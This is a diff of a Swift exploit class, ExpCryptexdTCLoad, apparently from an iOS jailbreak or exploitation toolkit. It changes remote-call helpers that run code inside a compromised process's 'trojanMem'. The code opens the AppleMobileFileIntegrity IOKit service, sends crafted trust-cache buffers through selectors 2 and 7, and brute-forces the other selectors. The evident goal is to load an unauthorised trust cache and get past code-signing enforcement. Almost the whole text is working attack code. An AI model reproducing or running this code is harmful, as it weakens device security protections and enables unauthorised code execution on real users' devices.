@@ -203,7 +203,7 @@ final class ExpCryptexdTCLoad {
         
         // IOServiceMatching("AppleMobileFileIntegrity")
         let amfiStr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
-        let matching = RootExecutor.rcallAddr(rc, ioMatching, amfiStr)
+        let matching = RootExecutor.rcall(rc, "IOServiceMatching", amfiStr)
         log("Matching dict: 0x\(String(matching, radix: 16))")
         
         guard matching != 0 else {
@@ -211,7 +211,7 @@ final class ExpCryptexdTCLoad {
         }
         
         // IOServiceGetMatchingService(kIOMainPortDefault, matching)
-        let service = RootExecutor.rcallAddr(rc, ioGetMatch, 0, matching)
+        let service = RootExecutor.rcall(rc, "IOServiceGetMatchingService", 0, matching)
         log("AMFI service: 0x\(String(service, radix: 16))")
         
         guard service != 0 else {
@@ -229,7 +229,7 @@ final class ExpCryptexdTCLoad {
         // IOServiceOpen(service, task_self, 0, &connection)
         let connAddr = rc.trojanMem + 0x2800
         rc[connAddr].setValue32(0)
-        let kr = RootExecutor.rcallAddr(rc, ioOpen, service, taskSelf, 0, connAddr)
+        let kr = RootExecutor.rcall(rc, "IOServiceOpen", service, taskSelf, 0, connAddr)
         let conn = rc[connAddr].value32()
         log("IOServiceOpen: kr=0x\(String(kr, radix: 16)) conn=0x\(String(conn, radix: 16))")
         
@@ -253,7 +253,7 @@ final class ExpCryptexdTCLoad {
         let outBuf = rc.trojanMem + 0x4800
         let outSizeAddr = rc.trojanMem + 0x4900
         rc[outSizeAddr].setValue64(256)
-        let sel2Result = RootExecutor.rcallAddr(rc, ioCallMethod,
+        let sel2Result = RootExecutor.rcall(rc, "IOConnectCallStructMethod",
             UInt64(conn), 2, tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
         log("Selector 2 → 0x\(String(sel2Result, radix: 16))")
         
@@ -278,7 +278,7 @@ final class ExpCryptexdTCLoad {
         let totalSize = UInt64(16 + tcData.count)
         
         rc[outSizeAddr].setValue64(256)
-        let sel7Result = RootExecutor.rcallAddr(rc, ioCallMethod,
+        let sel7Result = RootExecutor.rcall(rc, "IOConnectCallStructMethod",
             UInt64(conn), 7, sel7Buf, totalSize, outBuf, outSizeAddr)
         log("Selector 7 → 0x\(String(sel7Result, radix: 16))")
         
@@ -293,7 +293,7 @@ final class ExpCryptexdTCLoad {
         log("Trying other selectors...")
         for sel: UInt32 in [0, 1, 3, 4, 5, 6, 8, 9, 10] {
             rc[outSizeAddr].setValue64(256)
-            let r = RootExecutor.rcallAddr(rc, ioCallMethod,
+            let r = RootExecutor.rcall(rc, "IOConnectCallStructMethod",
                 UInt64(conn), UInt64(sel), tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
             if r == 0 {
                 log("✅ Selector \(sel) → SUCCESS!")
@@ -339,19 +339,19 @@ final class ExpCryptexdTCLoad {
         }
         
         let amfiStr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
-        let matching = RootExecutor.rcallAddr(sb, ioMatching, amfiStr)
+        let matching = RootExecutor.rcall(sb, "IOServiceMatching", amfiStr)
         log("Matching: 0x\(String(matching, radix: 16))")
         
         if matching == 0 { log("❌ IOServiceMatching failed"); return }
         
-        let service = RootExecutor.rcallAddr(sb, ioGetMatch, 0, matching)
+        let service = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matching)
         log("Service: 0x\(String(service, radix: 16))")
         
         if service == 0 { log("❌ AMFI service not found"); return }
         
         let connAddr = sb.trojanMem + 0x2800
         sb[connAddr].setValue32(0)
-        let kr = RootExecutor.rcallAddr(sb, ioOpen, service, UInt64(mach_task_self_), 0, connAddr)
+        let kr = RootExecutor.rcall(sb, "IOServiceOpen", service, UInt64(mach_task_self_), 0, connAddr)
         let conn = sb[connAddr].value32()
         log("IOServiceOpen: kr=0x\(String(kr, radix: 16)) conn=\(conn)")
         
@@ -367,7 +367,7 @@ final class ExpCryptexdTCLoad {
             let outBuf = sb.trojanMem + 0x4800
             let outSz = sb.trojanMem + 0x4900
             sb[outSz].setValue64(256)
-            let r = RootExecutor.rcallAddr(sb, ioCallMethod,
+            let r = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                 UInt64(conn), 2, tcBuf, UInt64(tcData.count), outBuf, outSz)
             log("Selector 2 → 0x\(String(r, radix: 16))")
         }
